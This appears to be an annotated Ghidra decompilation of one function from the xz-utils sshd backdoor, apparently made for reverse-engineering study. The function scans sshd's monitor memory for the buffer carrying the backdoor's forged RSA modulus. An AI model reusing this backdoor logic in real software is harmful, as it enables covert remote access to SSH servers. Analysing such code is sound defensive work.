// /home/kali/xzre-ghidra/xzregh/107A20_sshd_get_sshbuf.c
// Function: sshd_get_sshbuf @ 0x107A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sshbuf(sshbuf * sshbuf, global_context_t * ctx)


/*
 * AutoDoc: Recovers the `sshbuf` that now holds the forged modulus inside sshd's monitor context. It validates the cached
 * `monitor_struct_slot`, uses `sshd_offsets` to locate the pkex table plus the sshbuf data/size fields, and either dereferences the
 * known slot or brute-forces the pkex array when offsets are unknown. Every candidate goes through `sshbuf_extract`; two buffers
 * must decode to the SSH banner string IDs before the third is accepted as the negative bignum carrying the fake modulus.
 */
#include "xzre_types.h"

BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)

{
  kex *pkex_table_end;
  char pkex_slot_index;
  byte size_index;
  byte data_index;
  monitor *monitor_ptr;
  BOOL probe_ok;
  EncodedStringId banner_id;
  ulong data_field_offset;
  ulong size_field_offset;
  kex **pkex_table;
  kex *pkex_cursor;
  u64 pkex_entry_span;
  uint banner_hits;
  
  if (sshbuf == (sshbuf *)0x0) {
    return FALSE;
  }
  if (((ctx != (global_context_t *)0x0) && (ctx->monitor_struct_slot != (monitor **)0x0)) &&
     (probe_ok = is_range_mapped((u8 *)ctx->monitor_struct_slot,8,ctx), probe_ok != FALSE)) {
    monitor_ptr = *ctx->monitor_struct_slot;
    probe_ok = is_range_mapped((u8 *)monitor_ptr,0x20,ctx);
    if (probe_ok != FALSE) {
      pkex_slot_index = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
      // AutoDoc: Start from the in-struct pkex table pointer; when the offsets cache supplies an override we follow that instead.
      pkex_table = monitor_ptr->pkex_table;
      if (-1 < pkex_slot_index) {
        pkex_table = *(kex ***)((long)&monitor_ptr->child_to_monitor_fd + (long)((int)pkex_slot_index << 2));
      }
      size_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
      data_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
      pkex_entry_span = 0x48;
      // AutoDoc: When both qword indices are known, derive byte offsets so the later field probes land on the remapped struct layout.
      if (-1 < (char)(data_index & size_index)) {
        size_field_offset = (ulong)((int)(char)size_index << 3);
        data_field_offset = (ulong)((int)(char)data_index << 3);
        pkex_entry_span = size_field_offset + 8;
        if (size_field_offset < data_field_offset) {
          pkex_entry_span = data_field_offset + 8;
        }
      }
      probe_ok = is_range_mapped((u8 *)pkex_table,8,ctx);
      if ((probe_ok != FALSE) &&
         (probe_ok = is_range_mapped(&(*pkex_table)->opaque,0x400,ctx), probe_ok != FALSE)) {
        pkex_slot_index = *(char *)&(ctx->sshd_offsets).field0_0x0;
        pkex_cursor = *pkex_table;
        if (pkex_slot_index < '\0') {
          banner_hits = 0;
          pkex_table_end = pkex_cursor + 0x400;
          for (; pkex_cursor < pkex_table_end; pkex_cursor = pkex_cursor + 8) {
            // AutoDoc: Walk each pkex slot only if its inline struct is mapped—a partially initialised monitor entry is ignored.
            probe_ok = is_range_mapped(&pkex_cursor->opaque,pkex_entry_span,ctx);
            if ((probe_ok != FALSE) &&
               // AutoDoc: Project the candidate `sshbuf` through the offset helper so we can safely read its data pointer and length.
               (probe_ok = sshbuf_extract(*(sshbuf **)pkex_cursor,ctx,&sshbuf->d,&sshbuf->size),
               probe_ok != FALSE)) {
              if (banner_hits < 2) {
                // AutoDoc: Require two buffers in a row to look like SSH handshake banners before trusting the subsequent pkex entry.
                banner_id = get_string_id((char *)sshbuf->d,(char *)(sshbuf->d + 7));
                if ((banner_id == STR_SSH_2_0) || (banner_id == STR_ssh_2_0)) {
                  banner_hits = banner_hits + 1;
                }
              }
              else {
                // AutoDoc: Finally ensure the extracted buffer resembles a negative big integer—the forged modulus always sets its sign bit.
                probe_ok = sshbuf_bignum_is_negative(sshbuf);
                if (probe_ok != FALSE) {
                  return TRUE;
                }
              }
            }
          }
        }
        else {
          probe_ok = sshbuf_extract(*(sshbuf **)(pkex_cursor + ((int)pkex_slot_index << 3)),ctx,&sshbuf->d,
                                 &sshbuf->size);
          if (probe_ok != FALSE) {
            probe_ok = sshbuf_bignum_is_negative(sshbuf);
            return (uint)(probe_ok != FALSE);
          }
        }
      }
    }
  }
  return FALSE;
}

